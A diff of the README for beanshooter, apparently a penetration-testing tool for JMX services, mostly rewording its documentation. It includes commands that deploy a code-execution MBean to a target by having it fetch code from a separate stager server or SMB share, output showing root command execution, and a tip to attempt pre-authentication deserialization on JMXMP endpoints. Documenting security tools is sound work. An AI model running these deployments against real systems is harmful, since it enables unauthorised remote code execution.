@@ -310,7 +310,6 @@ the `--ssl` option:
 ...
 ```
 
-
 #### List
 
 The `list` action prints a list of all registered *MBeans* on the remote *JMX* service:
@@ -361,13 +360,16 @@ id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
+Against *JMXMP* endpoints, preauthenticated deserialization is usually possible. Unfortunately, there is no way to enumerate this properly
+during the `enum` action. If you encounter a *JMXMP* endpoint, you should just give it a try.
+
 #### Stager
 
 The `stager` action starts a stager server that can be used to deliver *MBeans*. Creating a stager server
 for *MBean* delivery is normally done automatically when using *beanshooters* `deploy` action. However,
 sometimes it is required to use a standalone server. When using the `stager` action, you can either specify
-the name of a builtin *MBean* to deliver or the keyword `custom`. If `custom` was specified, the `--class-name`,
-`--object-name` and `--jar-file` options are required.
+the name of a builtin *MBean* to deliver (e.g. `tonka`) or the `custom` keyword. If `custom` was specified,
+the `--class-name`, `--object-name` and `--jar-file` options are required.
 
 ```console
 [qtc@devbox ~]$ beanshooter tonka deploy 172.17.0.2 9010 --stager-url http://172.17.0.1:8888 --no-stager
@@ -418,7 +420,7 @@ listing shows an example for the `mlet` *MBean* and the associated subparser:
 usage: beanshooter mlet [-h]   ...
 
 positional arguments:
-                          
+
     load                 load a new MBean from the specified URL
     status               checks whether the MBean is registered
     info                 print detailed information about the MBean
@@ -434,11 +436,11 @@ named arguments:
 
 ---
 
-Some *beanshooter* operations are available on each *MBean* and are demonstrated in this section.
+Some *beanshooter* operations are available for each *MBean* and are demonstrated in this section.
 
 #### Generic Info
 
-The `info` action lists some information on the specified *MBean*:
+The `info` action lists some general information on the specified *MBean*:
 
 ```console
 [qtc@devbox ~]$ beanshooter tonka info
@@ -450,7 +452,7 @@ The `info` action lists some information on the specified *MBean*:
 
 The `Jar File` information indicates whether an implementation of the corresponding *MBean* is builtin
 into *beanshooter*. This jar file is used during deployment, if not overwritten using the `--jar-file`
-option.
+option. Currently, the *TonkaBean* is the only *MBean* that has a *Jar File* available.
 
 #### Generic Status
 
@@ -483,7 +485,7 @@ form an *SMB* service listening on `10.10.10.5`, you could use the following com
 ```
 
 Afterwards, you can upload the exported *jar* and the `index.html` file to the *SMB* service and use the *beanshooters*
-deploy action with `--stager-url file:////10.10.10.5/share/index.html`.
+deploy action with the `--stager-url file:////10.10.10.5/share/index.html` option.
 
 #### Generic Deploy
 
